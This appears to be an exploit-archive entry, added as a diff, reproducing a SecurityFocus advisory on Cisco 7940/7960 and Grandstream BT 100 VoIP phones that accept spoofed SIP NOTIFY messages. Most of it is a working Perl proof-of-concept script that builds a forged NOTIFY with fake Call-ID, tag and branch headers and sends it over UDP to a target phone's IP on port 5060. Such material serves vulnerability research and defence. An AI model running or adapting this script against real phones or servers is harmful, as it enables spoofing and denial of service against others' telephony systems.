@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/14174/info
+
+Multiple Vendor VoIP Phones handle spoofed SIP status messages in an improper manner. This issue could potentially lead a to a denial of service condition against a server.
+
+The issue arises because the affected phones do not verify the 'Call-ID', 'tag' and 'branch' headers of NOTIFY messages and process spoofed status messages instead of rejecting the messages.
+
+Cisco 7940 and 7960 and Grandstream BT 100 phones are affected by this issue. Other vendors may be vulnerable as well. 
+
+#!/usr/bin/perl
+# SIP NOTIFY POC by DrFrancky@securax.org
+use Socket;
+SendSIPTo("10.0.0.1"); # IP of the phone
+
+sub SendSIPTo{
+$phone_ip = shift;
+$MESG="NOTIFY sip:chaos\@$phone_ip:5060 SIP/2.0
+Via: SIP/2.0/UDP 1.2.3.4:5060;branch=000000000000000
+From: \"drfrancky\" <sip:drfrancky\@1.2.3.4>;tag=000000000
+To:  <sip:chaos\@$phone_ip>
+Contact: <sip:drfrancky\@1.2.3.4>
+Event: message-summary
+Call-ID: drfrancky\@1.2.3.4
+CSeq: 102 NOTIFY
+Content-Type: application/simple-message-summary
+Content-Length: 37
+Messages-Waiting: yes
+Voicemail: 3/2";
+
+$proto = getprotobyname('udp');
+socket(SOCKET, PF_INET, SOCK_DGRAM, $proto) ;
+$iaddr = inet_aton("0.0.0.0");
+$paddr = sockaddr_in(5060, $iaddr);
+bind(SOCKET, $paddr) ;
+$port=5060;
+$hisiaddr = inet_aton($phone_ip) ;
+$hispaddr = sockaddr_in($port, $hisiaddr);
+send(SOCKET, $MESG, 0,$hispaddr ) || warn "send $host $!\n";
+}
+
